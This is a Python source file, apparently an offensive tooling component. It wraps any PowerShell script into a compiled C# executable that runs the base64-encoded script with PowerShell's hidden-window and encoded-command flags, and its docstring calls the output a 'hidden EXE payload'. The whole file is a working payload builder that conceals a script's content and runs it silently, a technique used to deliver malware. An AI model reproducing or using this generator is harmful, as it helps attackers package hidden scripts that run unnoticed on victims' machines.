import os
import subprocess
import base64

OUTPUT_DIR = "output"
os.makedirs(OUTPUT_DIR, exist_ok=True)

def generate_csharp_exe_from_ps(ps_file_path, exe_name=None):
    """
    Converts an existing PS1 file to a hidden EXE payload.
    Cross-platform: Windows -> powershell.exe, Linux/macOS -> pwsh.
    """
    if not os.path.isfile(ps_file_path):
        print(f"[!] File not found: {ps_file_path}")
        return None

    # Determine output names
    base_name = exe_name if exe_name else os.path.splitext(os.path.basename(ps_file_path))[0]
    cs_path = os.path.join(OUTPUT_DIR, f"{base_name}.cs")
    exe_path = os.path.join(OUTPUT_DIR, f"{base_name}.exe")

    # Read and encode PS1
    with open(ps_file_path, "r", encoding="utf-8") as f:
        ps_content = f.read()
    ps_b64 = base64.b64encode(ps_content.encode("utf-16le")).decode()

    # C# template with OS check
    cs_code = f'''
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PS1_Executor
{{
    class Program
    {{
        static void Main(string[] args)
        {{
            try
            {{
                string psCommand = "-NoProfile -WindowStyle Hidden -EncodedCommand {ps_b64}";
                string psBinary = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "powershell.exe" : "pwsh";

                ProcessStartInfo psi = new ProcessStartInfo(psBinary, psCommand);
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardError = true;
                psi.RedirectStandardOutput = true;

                Process p = Process.Start(psi);
                p.WaitForExit();

                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();

                if (!string.IsNullOrEmpty(output))
                    Console.WriteLine("[Output]\\n" + output);
                if (!string.IsNullOrEmpty(error))
                    Console.WriteLine("[Error]\\n" + error);
            }}
            catch (Exception ex)
            {{
                Console.WriteLine("Error: " + ex.Message);
            }}
        }}
    }}
}}
'''

    # Write C# file
    with open(cs_path, "w", encoding="utf-8") as f:
        f.write(cs_code)

    # Compile EXE
    try:
        subprocess.run(["mcs", "-out:" + exe_path, cs_path], check=True)
        print(f"[+] EXE generated from PS1: {exe_path}")
        return exe_path
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to compile EXE: {e}")
        return None
